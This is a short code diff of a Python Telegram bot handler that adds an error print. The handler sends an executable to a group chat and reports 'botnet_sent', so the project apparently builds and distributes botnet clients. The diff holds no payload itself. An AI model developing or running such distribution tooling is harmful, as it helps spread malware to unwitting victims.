@@ -267,6 +267,7 @@ async def receive_bot_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await telegram_service.send_file(exe_path, group_info['bot_token'], group_info['group_chat_id'])
         await update.message.reply_text(get_text("botnet_sent", lang))
     except Exception as e:
+        print("error: ", e)
         await update.message.reply_text(get_text("botnet_sending_failed", lang))
         return ConversationHandler.END
     
